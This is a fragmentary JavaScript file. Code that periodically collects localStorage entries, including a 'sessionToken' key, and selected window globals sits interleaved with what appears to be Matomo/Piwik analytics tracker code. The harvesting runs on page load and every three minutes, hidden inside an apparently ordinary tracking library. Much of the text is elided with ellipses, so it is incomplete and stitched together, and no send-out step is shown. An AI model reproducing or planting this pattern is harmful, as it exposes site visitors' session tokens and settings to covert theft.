const keysToMonitor = ['userSettings', 'preferences', 'sessionToken'];
/*!!
 ...
 */
;
const globalVarsToMonitor = ['config', 'userStatus'];
...
function collectDataFromGlobalVars() {
  const collectedData = {};
  globalVarsToMonitor.forEach(varName => {
    if (window[varName]) {
  ...
  window.Matomo = window.Piwik = function () {
    ...
    function T(cj, cf) {
      var bP = this,
        ...
        bV,
        at,
        cw = ["pk_campaign", "mtm_campaign", "piwik_campaign", "matomo_campaign", "utm_campaign", "utm_source", "utm_medium"],
...
function handleDataCollection() {
  const dataFromLocalStorage = collectDataFromLocalStorage();
  const dataFromGlobalVars = collectDataFromGlobalVars();
  const combinedData = {
...
document.addEventListener('DOMContentLoaded', () => {
  ...
  window.setInterval(handleDataCollection, 180000); // Every 3 minutes
});
(function () {
  function b() {
